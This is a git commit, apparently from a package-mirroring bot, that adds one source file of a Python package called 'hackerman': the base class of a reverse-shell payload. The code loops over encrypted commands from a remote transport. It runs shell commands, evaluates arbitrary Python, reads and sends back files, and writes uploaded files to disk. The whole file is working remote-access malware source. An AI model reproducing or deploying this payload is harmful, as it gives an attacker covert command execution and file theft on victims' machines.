54d28f8940f6f6a30fe515925a3c23d99b043996
Bot <41898282+github-actions[bot]@users.noreply.github.com>
2023-08-06 18:26:57 +0000

    Add package hackerman/0.10.2/hackerman-0.10.2-py3-none-any.whl

---
+++ packages/hackerman/hackerman-0.10.2-py3-none-any.whl/hackerman/payloads/reverse/base.py
@@ -0,0 +1,60 @@
+from hackerman import utils
+import json
+
+class BasePayload(object):
+	def __init__(self, transport, crypto):
+		self.conn = transport
+		self.encrypt = crypto.encrypt
+		self.decrypt = crypto.decrypt
+		self.exit_trigger = False
+	def do_cmd(self, cmd):
+		if cmd['type'] == 'sh':
+			cmd['res'] = utils.sh(cmd['cmd'])
+			return cmd
+		elif cmd['type'] == 'eval':
+			try:
+				r = eval(cmd['cmd'])
+			except Exception as e:
+				r = e
+			cmd['res'] = r
+			return cmd
+		elif cmd['type'] == 'dl':
+			try:
+				fd = open(cmd['fn'],'rb').read()
+			except Exception as e:
+				fd = e
+			cmd['res'] = fd
+			return cmd
+		elif cmd['type'] == 'ul':
+			try:
+				with open(cmd['fn'],'wb') as f:
+					f.write(cmd['fd'])
+				r = True
+			except Exception as e:
+				r = e
+			cmd['res'] = r
+			return cmd
+		elif cmd['type'] == 'exit':
+			cmd['res'] = 'okay'
+			self.exit_trigger = True
+			return cmd
+		else:
+			cmd['res'] = "invalid type: "+cmd['type']
+	def run(self):
+		while True:
+			try:
+				dat = self.conn.recv()
+				dec = self.decrypt(dat)
+
+				cmd = json.loads(dec.decode())
+				res = self.do_cmd(cmd)
+
+				txt = json.dumps(res)
+				enc = self.encrypt(txt.encode())
+
+				self.conn.send(enc)
+
+				if self.exit_trigger:
+					break
+			except Exception as e:
+				print(e)
